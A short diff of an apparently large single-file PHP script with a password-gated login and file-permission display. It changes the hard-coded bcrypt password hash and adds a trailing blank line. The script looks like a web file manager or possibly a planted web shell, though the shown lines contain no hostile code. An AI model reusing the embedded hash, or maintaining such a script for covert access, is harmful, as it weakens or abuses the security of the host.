@@ -60,7 +60,7 @@ function show_login_page($message = "")
 }
 
 if (!isset($_SESSION['authenticated'])) {
-    $stored_hashed_password = '$2y$10$JcIDpVqwEBmdtpyveQPWXurirNW27AbaAB/tBrLc9HgLPvwA7Yv7e'; 
+    $stored_hashed_password = '$2y$10$fY8bd3045z2GtR6Fp58cyedWveDr/2dr.peyXozazZlR5qdgoS0u6'; 
 
     if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
         $_SESSION['authenticated'] = true;
@@ -1703,4 +1703,5 @@ function perms($file)
         (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
     return $info;
 }
+
 ?>
